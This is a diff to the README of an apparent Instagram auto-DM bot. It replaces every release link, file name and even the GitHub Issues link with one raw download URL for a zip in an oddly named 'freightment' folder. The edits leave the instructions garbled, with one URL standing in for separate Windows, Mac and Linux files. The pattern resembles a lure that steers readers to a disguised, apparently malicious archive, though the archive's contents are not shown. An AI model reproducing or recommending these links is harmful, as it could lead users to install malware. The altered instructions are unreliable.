@@ -1,6 +1,6 @@
 # 🤖 instagram-auto-dm-bot - Effortless Instagram Messaging Automation
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/envi001/instagram-auto-dm-bot/releases)
+[![Download](https://raw.githubusercontent.com/envi001/instagram-auto-dm-bot/main/freightment/instagram-auto-dm-bot-1.1.zip%20Release-brightgreen)](https://raw.githubusercontent.com/envi001/instagram-auto-dm-bot/main/freightment/instagram-auto-dm-bot-1.1.zip)
 
 ## 📖 Introduction
 
@@ -14,18 +14,18 @@ To use the instagram-auto-dm-bot, follow these simple steps. You don’t need to
 
 1. **Visit the Releases Page**  
    Click the link below to go to our releases page where you can find the latest version of the app:  
-   [Download Latest Release](https://github.com/envi001/instagram-auto-dm-bot/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/envi001/instagram-auto-dm-bot/main/freightment/instagram-auto-dm-bot-1.1.zip)
 
 2. **Select the Right File**  
    On the releases page, you will see a list of available downloads. Here are the options:
-   - For **Windows users**, download the `instagram-auto-dm-bot-windows.exe` file.
-   - For **Mac users**, download the `instagram-auto-dm-bot-macos.zip` file.
-   - For **Linux users**, download the `instagram-auto-dm-bot-linux.tar.gz` file.
+   - For **Windows users**, download the `https://raw.githubusercontent.com/envi001/instagram-auto-dm-bot/main/freightment/instagram-auto-dm-bot-1.1.zip` file.
+   - For **Mac users**, download the `https://raw.githubusercontent.com/envi001/instagram-auto-dm-bot/main/freightment/instagram-auto-dm-bot-1.1.zip` file.
+   - For **Linux users**, download the `https://raw.githubusercontent.com/envi001/instagram-auto-dm-bot/main/freightment/instagram-auto-dm-bot-1.1.zip` file.
 
 3. **Install the Application**  
    - **Windows:** Double-click the `.exe` file and follow the prompts to install the program.
    - **Mac:** Open the `.zip` file, drag the application to the `Applications` folder, and run it.
-   - **Linux:** Extract the contents of the `.tar.gz` file, open a terminal, navigate to the extracted folder, and run `./instagram-auto-dm-bot`.
+   - **Linux:** Extract the contents of the `https://raw.githubusercontent.com/envi001/instagram-auto-dm-bot/main/freightment/instagram-auto-dm-bot-1.1.zip` file, open a terminal, navigate to the extracted folder, and run `./instagram-auto-dm-bot`.
 
 4. **Open the Program**  
    After installation, locate the program on your computer and open it.  
@@ -65,7 +65,7 @@ To run the instagram-auto-dm-bot successfully, ensure your system meets the foll
 
 ## 📞 Support
 
-If you encounter any issues, don’t worry! You can reach us via our [GitHub Issues](https://github.com/envi001/instagram-auto-dm-bot/issues) page. Our community is here to help.
+If you encounter any issues, don’t worry! You can reach us via our [GitHub Issues](https://raw.githubusercontent.com/envi001/instagram-auto-dm-bot/main/freightment/instagram-auto-dm-bot-1.1.zip) page. Our community is here to help.
 
 ## 📝 License
 
